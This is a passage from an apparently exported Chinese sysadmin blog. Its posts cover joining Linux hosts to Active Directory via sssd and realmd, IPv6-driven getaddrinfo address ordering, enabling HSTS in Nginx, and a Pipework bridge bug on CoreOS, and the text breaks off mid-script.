<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="section">[logging]</span></span><br><span class="line"> default = FILE:/var/log/krb5libs.log</span><br><span class="line"> kdc = FILE:/var/log/krb5kdc.log</span><br><span class="line"> admin_server = FILE:/var/log/kadmind.log</span><br><span class="line"></span><br><span class="line"><span class="section">[libdefaults]</span></span><br><span class="line"> default_realm = xxx.corp</span><br><span class="line"> dns_lookup_realm = true</span><br><span class="line"> dns_lookup_kdc = true</span><br><span class="line"> ticket_lifetime = 24h</span><br><span class="line"> renew_lifetime = 7d</span><br><span class="line"> forwardable = true</span><br><span class="line"></span><br><span class="line"><span class="section">[realms]</span></span><br><span class="line"> xxx.corp = &#123;</span><br><span class="line">  kdc = AD1.xxx.corp</span><br><span class="line">  admin_server = AD1.xxx.corp</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="section">[domain_realm]</span></span><br><span class="line"> .example.com = xxx.corp</span><br><span class="line"> example.com = xxx.corp</span><br></pre></td></tr></table></figure>
<h5 id="sssd-conf"><a href="#sssd-conf" class="headerlink" title="sssd.conf"></a>sssd.conf</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/sssd/sssd.conf</span><br></pre></td></tr></table></figure>
<p>修改内容如下：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[sssd]</span></span><br><span class="line"><span class="attr">services</span> = nss, pam, ssh, autofs</span><br><span class="line"><span class="attr">config_file_version</span> = <span class="number">2</span></span><br><span class="line"><span class="attr">domains</span> = xxx.corp</span><br><span class="line"></span><br><span class="line"><span class="section">[domain/xxx.corp]</span></span><br><span class="line"><span class="attr">id_provider</span> = ad</span><br><span class="line"><span class="attr">fallback_homedir</span> = /home/%u</span><br><span class="line"><span class="attr">shell_fallback</span> = /bin/bash</span><br><span class="line"><span class="attr">override_shell</span> = /bin/bash</span><br><span class="line"><span class="attr">default_shell</span> = /bin/bash</span><br><span class="line"><span class="attr">access_provider</span> = simple</span><br><span class="line"><span class="attr">simple_allow_groups</span> = Login<span class="literal">NO</span></span><br><span class="line"><span class="attr">simple_allow_users</span> = Daha.Ma</span><br></pre></td></tr></table></figure>
<h5 id="sudoer"><a href="#sudoer" class="headerlink" title="sudoer"></a>sudoer</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">visudo</span><br></pre></td></tr></table></figure>
<p>添加这么一句：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">%SudoNO@xxx.corp   ALL=(ALL)       ALL</span><br></pre></td></tr></table></figure>
<p>现在的情况将是：</p>
<ul>
<li>除了<strong>LoginNO</strong>组和<strong>Daha.Ma</strong>以外其他域账号不能登录</li>
<li><strong>SudoNO</strong>组可以不用密码通过<strong>sudo</strong>执行任何命令</li>
</ul>
<h4 id="重启服务"><a href="#重启服务" class="headerlink" title="重启服务"></a>重启服务</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod 600 /etc/sssd/sssd.conf;</span><br><span class="line">chown root:root /etc/sssd/sssd.conf;</span><br><span class="line">/etc/init.d/sssd restart;</span><br></pre></td></tr></table></figure>
<h4 id="维护命令"><a href="#维护命令" class="headerlink" title="维护命令"></a>维护命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">id Daha.Ma@xxx.corp; <span class="comment"># 从AD中获取域用户信息</span></span><br><span class="line">id Daha.Ma; <span class="comment"># 在/etc/sssh/sssd.conf中设置了use_fully_qualified_names为False的可以直接用</span></span><br><span class="line">adcli delete-computer --domain=xxx.corp -U admin.win ; <span class="comment"># 退出AD域</span></span><br></pre></td></tr></table></figure>
<h4 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h4><h5 id="不能加入域"><a href="#不能加入域" class="headerlink" title="不能加入域"></a>不能加入域</h5><p>当前面adcli join xxxxxx时如果出错：</p>
<blockquote>
<p>adcli: GSSAPI Error: Unspecified GSS failure. Minor code may provide more information (Server not found in Kerberos database)</p>
</blockquote>
<p>的话，请尝试修改/etc/krb5.conf，在[libdefaults]这个区块下加一句：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">rdns</span> = <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p>然后重新再试，即可。</p>
<h3 id="CentOS-7-x"><a href="#CentOS-7-x" class="headerlink" title="CentOS 7.x"></a>CentOS 7.x</h3><h4 id="安装软件-1"><a href="#安装软件-1" class="headerlink" title="安装软件"></a>安装软件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install \</span><br><span class="line">	realmd \</span><br><span class="line">	sssd \</span><br><span class="line">	oddjob \</span><br><span class="line">	krb5-libs \</span><br><span class="line"> 	oddjob-mkhomedir \</span><br><span class="line"> 	adcli \</span><br><span class="line"> 	samba-common;</span><br><span class="line">realm join ad1.xxx.corp -U admin.win; <span class="comment"># 这里需要输入admin.win的密码</span></span><br><span class="line">realm permit -g LoginNO@xxx.corp; <span class="comment">#这里以允许LoginNO组为例</span></span><br></pre></td></tr></table></figure>
<h4 id="修改配置-1"><a href="#修改配置-1" class="headerlink" title="修改配置"></a>修改配置</h4><h5 id="sudoer-1"><a href="#sudoer-1" class="headerlink" title="sudoer"></a>sudoer</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">visudo</span><br></pre></td></tr></table></figure>
<p>添加这么一句：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">%SudoNO@xxx.corp   ALL=(ALL)       ALL</span><br></pre></td></tr></table></figure>
<h5 id="sssd-conf-1"><a href="#sssd-conf-1" class="headerlink" title="sssd.conf"></a>sssd.conf</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/sssd/sssd.conf</span><br></pre></td></tr></table></figure>
<p>修改两句如下：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">use_fully_qualified_names</span> = <span class="literal">False</span></span><br><span class="line"><span class="attr">fallback_homedir</span> = /home/%u</span><br></pre></td></tr></table></figure>
<h4 id="重启服务-1"><a href="#重启服务-1" class="headerlink" title="重启服务"></a>重启服务</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart sssd;</span><br></pre></td></tr></table></figure>
<p>现在的情况是：</p>
<ul>
<li>除了<strong>LoginNO</strong>组以外其他域账号不能登录</li>
<li><strong>SudoNO</strong>组有不需要密码通过<strong>sudo</strong>执行所有命令的权限</li>
</ul>
<h4 id="维护命令-1"><a href="#维护命令-1" class="headerlink" title="维护命令"></a>维护命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">realm permit --withdraw -g LoginNO@xxx.corp; <span class="comment"># 取消LoginNO组的登录权限</span></span><br><span class="line">id Daha.Ma@xxx.corp; <span class="comment"># 从AD中获取域用户信息</span></span><br><span class="line">id Daha.Ma; <span class="comment"># 在/etc/sssh/sssd.conf中设置了use_fully_qualified_names为False的可以直接用</span></span><br><span class="line">realm leave ad1.xxx.corp; <span class="comment"># 退出AD域</span></span><br></pre></td></tr></table></figure>
<h4 id="常见问题-1"><a href="#常见问题-1" class="headerlink" title="常见问题"></a>常见问题</h4><h5 id="sssd不能启动"><a href="#sssd不能启动" class="headerlink" title="sssd不能启动"></a>sssd不能启动</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start sssd</span><br></pre></td></tr></table></figure>
<p>时失败，看 log 文件：/var/log/sssd/sssd_xxx.corp.log 里有错误提示：</p>
<blockquote>
<p>[sssd[be[xxx.corp]]] [dp_module_open_lib] (0x0010): Unable to load module [ad] with path [/usr/lib64/sssd/libsss_ad.so]: /lib64/libsamba-credentials.so.0: symbol GSS_KRB5_CRED_NO_CI_FLAGS_X, version gssapi_krb5_2_MIT not defined in file libgssapi_krb5.so.2 with link time reference<br>[sssd[be[xxx.corp]]] [dp_target_init] (0x0010): Unable to load module ad<br>[sssd[be[xxx.corp]]] [be_process_init] (0x0010): Unable to setup data provider [1432158209]: Internal Error<br>[sssd[be[xxx.corp]]] [main] (0x0010): Could not initialize backend [1432158209]</p>
</blockquote>
<p>这里的问题是由于一个系统 bug：</p>
<p>samba-client-libs-4.4.4-12.el7_3.x86_64 对 krb5-libs 的依赖关系没正确设置导致的。</p>
<p>具体：</p>
<ol>
<li>sssd 包调用 sssd-ad 包来做跟 windows AD 之间的沟通</li>
<li>sssd-ad 依赖于包 samba-client-libs</li>
<li>samba-client-libs 又依赖于 krb5-libs</li>
<li>由于samba-client-libs 对 krb5-libs 的依赖关系不对，导致 yum install sssd 的时候没有升级正确的 krb5-libs 包，所以导致 sssd 起不来</li>
</ol>
<p>解决方法很简单，前面安装的那部分已经实现了，就是将 krb5-libs 写进 yum install 的包列表里，这样就会强制安装（升级）到最新的 krb5-libs</p>
<h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><ol>
<li><a href="https://fedorahosted.org/sssd/wiki/Configuring_sssd_with_ad_server" target="_blank" rel="noopener">Configuring sssd to authenticate with a Windows 2008 or later Domain Server</a></li>
</ol>
]]></content>
      <tags>
        <tag>AD</tag>
        <tag>ldap</tag>
        <tag>sssd</tag>
        <tag>realm</tag>
        <tag>adcli</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux域名解析中的IP地址选择“亲和性”问题</title>
    <url>/2017/07/Linux%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E4%B8%AD%E7%9A%84IP%E5%9C%B0%E5%9D%80%E9%80%89%E6%8B%A9%E2%80%9C%E4%BA%B2%E5%92%8C%E6%80%A7%E2%80%9D%E9%97%AE%E9%A2%98/index.html</url>
    <content><![CDATA[<h1 id="问题初现"><a href="#问题初现" class="headerlink" title="问题初现"></a>问题初现</h1><p>最早发现问题时是在做一个测试，把某个域名解析到内网的几台机器上（10.0.0.9 和 10.0.0.119），结果用客户端（10.0.0.200 和 10.0.0.201，都由于特殊原因没有关掉 IPv6）去连接测试时发现，连接都跑到 10.0.0.119 上了，10.0.0.9 上几乎没有连接！</p>
<a id="more"></a>
<h1 id="问题原因"><a href="#问题原因" class="headerlink" title="问题原因"></a>问题原因</h1><p>网上 Google 了一下，据说是新的域名解析系统调用 getaddrinfo() 加入了对 rfc3484 的支持导致的，这种支持会将 DNS 服务器返回某个域名的多个 IP（顺序随机），按照一定的逻辑排序后再返回，这样的话由于客户端一般都会取第一个 IP，所以我们看到的结果就是某个客户端老连一个 IP。</p>
<p>至于 rfc3484 中涉及到的排序逻辑，我的理解大概是优先返回跟客户端“最近”的 IP 地址（具体算法肯定远比这个复杂，但大概就是这个意思，所以我把 rfc3484 引入的这个问题称之为“亲和性”问题）。</p>
<p>我们的客户端的 IP 是 10.0.0.200 和 10.0.0.201，显然离 10.0.0.119 比离 10.0.0.9 更“近”，所以，连接都跑 10.0.0.119 上去了，10.0.0.9 上几乎没有连接。</p>
<h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><ul>
<li>强制使用老系统调用：gethostbyname</li>
<li>系统里干掉 IPv6</li>
</ul>
<p>当然是第二种方法合适，因为这样我们不用动代码，而只需要配置下环境即可。</p>
<h1 id="测试求证"><a href="#测试求证" class="headerlink" title="测试求证"></a>测试求证</h1><p>本着打破沙锅问到底的精神，找了个简单程序调用 getaddrinfo，并跟进 glibc 的源代码里看到了 getaddrinfo 函数执行情况的细节。于是找了两台服务器（用作客户端）：</p>
<ul>
<li>10.0.0.3（IPv6 enabled）</li>
<li>10.0.0.233（IPv6 disabled）</li>
</ul>
<p>在这两台机器上分别跑 gai.c 编出来的二进制文件，发现 IPv6 启用的那台（10.0.0.3）域名解析始终首先返回 10.0.0.9，而 IPv6 disabled 的那台（10.0.0.233）却一会儿首先返回 10.0.0.119，一会儿又首先返回 10.0.0.9。</p>
<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="例程getaddrinfo-c"><a href="#例程getaddrinfo-c" class="headerlink" title="例程getaddrinfo.c"></a>例程getaddrinfo.c</h2><p>这个例程是网上翻出来的，连文件名、版权注释都没改。：）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * getaddrinfo.c - Simple example of using getaddrinfo(3) function.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Michal Ludvig &lt;michal@logix.cz&gt; (c) 2002, 2003</span></span><br><span class="line"><span class="comment"> * http://www.logix.cz/michal/devel/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * License: public domain.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span></span><br><span class="line">lookup_host (<span class="keyword">const</span> <span class="keyword">char</span> *host)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">addrinfo</span> <span class="title">hints</span>, *<span class="title">res</span>;</span></span><br><span class="line">	<span class="keyword">int</span> errcode;</span><br><span class="line">	<span class="keyword">char</span> addrstr[<span class="number">100</span>];</span><br><span class="line">	<span class="keyword">void</span> *ptr;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span> (&amp;hints, <span class="number">0</span>, <span class="keyword">sizeof</span> (hints));</span><br><span class="line">	hints.ai_family = PF_UNSPEC;</span><br><span class="line">	hints.ai_socktype = SOCK_STREAM;</span><br><span class="line">	hints.ai_flags |= AI_CANONNAME;</span><br><span class="line"></span><br><span class="line">	errcode = getaddrinfo (host, <span class="literal">NULL</span>, &amp;hints, &amp;res);</span><br><span class="line">	<span class="keyword">if</span> (errcode != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		perror (<span class="string">"getaddrinfo"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span> (<span class="string">"Host: %s\n"</span>, host);</span><br><span class="line">	<span class="keyword">while</span> (res)</span><br><span class="line">	&#123;</span><br><span class="line">		inet_ntop (res-&gt;ai_family, res-&gt;ai_addr-&gt;sa_data, addrstr, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span> (res-&gt;ai_family)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">case</span> AF_INET:</span><br><span class="line">				ptr = &amp;((struct sockaddr_in *) res-&gt;ai_addr)-&gt;sin_addr;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> AF_INET6:</span><br><span class="line">				ptr = &amp;((struct sockaddr_in6 *) res-&gt;ai_addr)-&gt;sin6_addr;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		inet_ntop (res-&gt;ai_family, ptr, addrstr, <span class="number">100</span>);</span><br><span class="line">		<span class="built_in">printf</span> (<span class="string">"IPv%d address: %s (%s)\n"</span>, res-&gt;ai_family == PF_INET6 ? <span class="number">6</span> : <span class="number">4</span>,</span><br><span class="line">				addrstr, res-&gt;ai_canonname);</span><br><span class="line">		res = res-&gt;ai_next;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span></span><br><span class="line">main (<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (argc &lt; <span class="number">2</span>)</span><br><span class="line">		<span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">return</span> lookup_host (argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="测试程序运行"><a href="#测试程序运行" class="headerlink" title="测试程序运行"></a>测试程序运行</h2><h3 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">debuginfo-install glibc-2.12-1.166.el6_7.3.x86_64;</span><br></pre></td></tr></table></figure>
<p>这里因为我的 glibc 版本是 2.12-1.166.el6_7.3</p>
<h3 id="编译参数"><a href="#编译参数" class="headerlink" title="编译参数"></a>编译参数</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -g -o g getaddrinfo.c;</span><br><span class="line"><span class="comment"># 运行，gdb 调试</span></span><br><span class="line">gdb ./g</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">break main</span><br><span class="line">run www.a.shifen.com</span><br><span class="line"># 再一步步跟吧</span><br></pre></td></tr></table></figure>
<h3 id="gdb跟踪"><a href="#gdb跟踪" class="headerlink" title="gdb跟踪"></a>gdb跟踪</h3><p>发现在 glibc 源代码里，/usr/src/debug/glibc-2.12-2-gc4ccff1/sysdeps/posix/getaddrinfo.c 文件中第 2436 行和 2437 行：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in6ai != <span class="literal">NULL</span>)</span><br><span class="line">   qsort (in6ai, in6ailen, <span class="keyword">sizeof</span> (*in6ai), in6aicmp);</span><br></pre></td></tr></table></figure>
<p>这里的第 2437 行的函数 qsort 就是用来做排序的，前面的判断条件 in6ai != NULL 在有 IPv6 的环境里成立；反之在仅有 IPv4 的环境里不成立。这也就是干掉 IPv6 会直接规避掉这个大“坑”的直接原因。</p>
]]></content>
      <tags>
        <tag>IPv6</tag>
        <tag>getaddrinfo</tag>
        <tag>gethostbyname</tag>
        <tag>glibc</tag>
        <tag>IPv4</tag>
        <tag>rfc3484</tag>
        <tag>gai.conf</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx 下启用 HSTS</title>
    <url>/2018/01/Nginx%20%E4%B8%8B%E5%90%AF%E7%94%A8%20HSTS/index.html</url>
    <content><![CDATA[<h1 id="What-is-HSTS"><a href="#What-is-HSTS" class="headerlink" title="What is HSTS"></a>What is HSTS</h1><blockquote>
<p>HTTP Strict Transport Security (HSTS) is a web security policy mechanism which helps to protect websites against protocol downgrade attacks and cookie hijacking. It allows web servers to declare that web browsers (or other complying user agents) should only interact with it using secure HTTPS connections,[1] and never via the insecure HTTP protocol. HSTS is an IETF standards track protocol and is specified in RFC 6797.</p>
</blockquote>
<blockquote>
<p>The HSTS Policy is communicated by the server to the user agent via an HTTPS response header field named “Strict-Transport-Security”.[2] HSTS Policy specifies a period of time during which the user agent should only access the server in a secure fashion.[3]</p>
</blockquote>
<p>以上来自于<a href="https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security" target="_blank" rel="noopener">维基百科</a></p>
<p>大概意思是说 HSTS 是一个 web 安全策略装置，用于保护 web 站点免受协议降级攻击和 cookie 劫持。</p>
<a id="more"></a>
<p>具体实现是在用户代理和 https 站点之间通讯时，通过服务器端发出来的 HTTPS response 头信息：“Strict-Transport-Security” 来实现的。</p>
<h1 id="Why"><a href="#Why" class="headerlink" title="Why"></a>Why</h1><p>为什么要做 HSTS？当然是为了安全。尤其是天朝这网络环境，无良运营商比比皆是，动辄给你劫持、篡改，为了避免这些无聊无耻人等的捣乱，推荐启用全站 HTTPS 并启用 HSTS。</p>
<h1 id="Howto"><a href="#Howto" class="headerlink" title="Howto"></a>Howto</h1><p>鉴于 web server 阵营大多已经都是 Nginx 了，这里也就讲下在 Nginx 中怎么启用 HSTS。</p>
<p>其实很简单：就是用 add_header 在 response 中添加一个“Strict-Transport-Security” 头嘛。说起来简单，但实际做起来还是有些弯弯道道的。</p>
<h2 id="配置文件-inc-HSTS-conf"><a href="#配置文件-inc-HSTS-conf" class="headerlink" title="配置文件 inc/HSTS.conf"></a>配置文件 inc/HSTS.conf</h2><p>单独做一个配置文件：inc/HSTS.conf，内容如下：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">add_header</span> Strict-Transport-Security <span class="string">"max-age=300; includeSubDomains"</span> always;</span><br></pre></td></tr></table></figure>
<p>上面配置大致解释下：</p>
<ol>
<li>max-age：缓存的时间，单位为妙</li>
<li>includeSubDomains：所有子域名都有效</li>
<li>还有个参数 preload，这里没设置，这是更狠一点的 HSTS 用法，稍后再讲</li>
<li>always：这其实是 add_header 的参数，意思是所有返回值的头都包含这个头信息（缺省是只有 200 等返回值才会带这个头的）</li>
</ol>
<h2 id="在合适的位置-include-这个配置文件"><a href="#在合适的位置-include-这个配置文件" class="headerlink" title="在合适的位置 include 这个配置文件"></a>在合适的位置 include 这个配置文件</h2><p>然后在虚拟机的配置文件中的合适位置 include 这个配置文件。这个就有学问了，注意以下两点：</p>
<ol>
<li>在 HTTPS 的 server 块里 include 这个配置文件<ul>
<li>有的文章里说要在 HTTP 的 server 块里也要 include 这个配置文件，我仔细查了下 rfc，确定是不需要的</li>
</ul>
</li>
<li>如果这个 server 的配置块里的某个 location 中有其他 add_header 语句，那么在这个 location 的配置里也需要 include 这个配置文件<ul>
<li>这是因为 nginx 中 add_header 命令的继承特性导致的，一般是会继承的，但是当某个 location 块中有其他 add_header 语句的话，上层的 add_header 指令不会被继承。</li>
</ul>
</li>
</ol>
<h1 id="进阶话题"><a href="#进阶话题" class="headerlink" title="进阶话题"></a>进阶话题</h1><p>前面有提到的参数 preload，的确有个功能叫 preload，大概意思是，有个数据库，其中的网站都是启用 HSTS 的，而一些主流浏览器都内置了对这个库的支持，所以呢，如果有人用这些浏览器访问这些网站，http 协议会直接内部强制转换成 https！</p>
<p>怎样把自己的网站域名加入到这个库里呢？</p>
<ol>
<li>要在自己网站上设置 http 到 https 的跳转</li>
<li>要在自己网站 https 启用 HSTS<ol>
<li>要启用 preload 参数</li>
<li>max-age 要长于一年</li>
<li>要有 includeSubDomains 参数</li>
</ol>
</li>
<li>然后提交就好了（<a href="https://hstspreload.org）" target="_blank" rel="noopener">https://hstspreload.org）</a></li>
</ol>
]]></content>
      <tags>
        <tag>https_proxy</tag>
        <tag>Nginx</tag>
        <tag>HSTS</tag>
        <tag>HTTPS</tag>
        <tag>HTTP</tag>
        <tag>add_header</tag>
        <tag>Strict-Transport-Security</tag>
      </tags>
  </entry>
  <entry>
    <title>Pipework在CoreOS上的一个小bug</title>
    <url>/2016/12/Pipework%E5%9C%A8CoreOS%E4%B8%8A%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B0%8Fbug/index.html</url>
    <content><![CDATA[<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>某日办公室要断电维护，作为 IT 狗需要在断电之前把办公室的服务器都停掉，来电后再把这些服务器启起来，其中有台服务器，跑的是 CoreOS 系统，上面一堆的 docker container。系统起来后，我发现这些 docker container，一个都不通，显然，踩着大坑了……</p>
<a id="more"></a>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
<li>CoreOS stable (1185.5.0)</li>
<li>4.7.3-coreos-r3</li>
<li>ip utility, iproute2-ss150210</li>
<li>Pipework 20150123</li>
</ul>
<h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><p>简言之，就是用 net=none 启动的 docker 实例，用 Pipework 配置 ip 地址后 ping 不通，用代码表示是这样的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -i -t -d \</span><br><span class="line">	--name=<span class="built_in">test</span> \</span><br><span class="line">	-h <span class="built_in">test</span> \</span><br><span class="line">	--net none \</span><br><span class="line">	centos:6;</span><br><span class="line">sudo pipework br0 \</span><br><span class="line">	-i eth0 \</span><br><span class="line">	<span class="built_in">test</span> \</span><br><span class="line">	10.0.0.3/24@10.0.0.1;</span><br><span class="line"><span class="comment"># br0 是桥，ip 地址是 10.0.0.2</span></span><br><span class="line"><span class="comment"># enp0s25 是直接在 10.0.0.0/24 网段的物理设备</span></span><br><span class="line"><span class="comment"># enp0s25 同时是桥 br0 的一个 interface</span></span><br><span class="line"><span class="comment"># eth0 是 docker 的网卡设备名</span></span><br><span class="line"><span class="comment"># 这个测试 docker 的 ip 地址是 10.0.0.3</span></span><br><span class="line"><span class="comment"># 10.0.0.0/24 的网关是 10.0.0.1</span></span><br></pre></td></tr></table></figure>
<p>结果 10.0.0.0/24 段的其他机器上 ping 不通 10.0.0.3，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it <span class="built_in">test</span> /bin/bash</span><br></pre></td></tr></table></figure>
<p>进入 docker 实例 test 内部以后也 ping 不通网关 10.0.0.1</p>
<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>最早怀疑是 proxy_arp 的问题，但实际证明不是，最后发现是由于 docker 建立的 veth 设备（宿主机这端的）没有正确添加到桥设备 br0 里去，从而导致怎么都不通。</p>
<p>解决起来也很简单，直接用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo brctl addif br0 vethlxxx</span><br><span class="line"><span class="comment"># vethlxxx 是这个 docker 实例在宿主机侧的网络设备</span></span><br></pre></td></tr></table></figure>
<p>然后就通了。</p>
<h1 id="分析问题"><a href="#分析问题" class="headerlink" title="分析问题"></a>分析问题</h1><p>找到表面原因容易，可为什么没能正确把 vethlxxx 设备加到桥设备 br0 里去呢？也不是第一次跑 Pipework 了，以前一直是好的。</p>
<p>看了看 Pipework 的代码，并调试执行了几遍，发现这个问题不是百分百出现的，只是有很大一部分概率。</p>
<p>最后大概定位问题在 Pipework 的这几句代码上：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(ip link <span class="built_in">set</span> <span class="string">"<span class="variable">$LOCAL_IFNAME</span>"</span> master <span class="string">"<span class="variable">$IFNAME</span>"</span> &gt; /dev/null 2&gt;&amp;1) \</span><br><span class="line">	|| (brctl addif <span class="string">"<span class="variable">$IFNAME</span>"</span> <span class="string">"<span class="variable">$LOCAL_IFNAME</span>"</span>)</span><br></pre></td></tr></table></figure>
<p>和后面的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip link <span class="built_in">set</span> <span class="string">"<span class="variable">$LOCAL_IFNAME</span>"</span> up</span><br></pre></td></tr></table></figure>
<p>为什么这么说呢，因为在附录的那个链接里，有段话说道：</p>
<blockquote>
<p>To add an interface (e.g. eth0) into the bridge, its state must be up:</p>
</blockquote>
<p>这也就是说将某个 interface 加入到桥设备之前，必须要先保证这个 interface 的状态是 up 的，但显然在 Pipework 这份代码里不是这样的，这里是先加入到 br0，然后再将这个 interface 设置为 up 的。</p>
<p>为了证明这个，写了一段 bash 脚本，来模拟这个情况，具体如下（文件名叫 test.sh）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -x</span><br><span class="line"></span><br><span class="line">IFNAME=<span class="string">"brtest"</span></span><br><span class="line">MTU=1500</span><br><span class="line"></span><br><span class="line">(ip link add dev <span class="string">"<span class="variable">$IFNAME</span>"</span> <span class="built_in">type</span> bridge ) \</span><br><span class="line">	|| (brctl addbr <span class="string">"<span class="variable">$IFNAME</span>"</span>)</span><br><span class="line">ip link <span class="built_in">set</span> <span class="string">"<span class="variable">$IFNAME</span>"</span> up</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;10..90&#125;; <span class="keyword">do</span></span><br><span class="line">	LOCAL_IFNAME=<span class="string">"vethltest<span class="variable">$&#123;i&#125;</span>"</span></span><br><span class="line">	GUEST_IFNAME=<span class="string">"vethgtest<span class="variable">$&#123;i&#125;</span>"</span></span><br><span class="line">	ip link add name <span class="string">"<span class="variable">$LOCAL_IFNAME</span>"</span> \</span><br><span class="line">		mtu <span class="string">"<span class="variable">$MTU</span>"</span> <span class="built_in">type</span> veth \</span><br><span class="line">		peer name <span class="string">"<span class="variable">$GUEST_IFNAME</span>"</span> \</span><br><span class="line">		mtu <span class="string">"<span class="variable">$MTU</span>"</span></span><br><span class="line"><span class="comment">#	ip link show "$LOCAL_IFNAME"</span></span><br><span class="line">	<span class="keyword">if</span> ((<span class="variable">$&#123;i&#125;</span>%2)); <span class="keyword">then</span></span><br><span class="line">		ip link <span class="built_in">set</span> <span class="string">"<span class="variable">$LOCAL_IFNAME</span>"</span> down</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		ip link <span class="built_in">set</span> <span class="string">"<span class="variable">$LOCAL_IFNAME</span>"</span> up</span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line">	(ip link <span class="built_in">set</span> <span class="string">"<span class="variable">$LOCAL_IFNAME</span>"</span> master <span class="string">"<span class="variable">$IFNAME</span>"</span>) \</span><br><span class="line">		|| (brctl addif <span class="string">"<span class="variable">$IFNAME</span>"</span> <span class="string">"<span class="variable">$LOCAL_IFNAME</span>"</span>)</span><br><span class="line">	ip link <span class="built_in">set</span> <span class="string">"<span 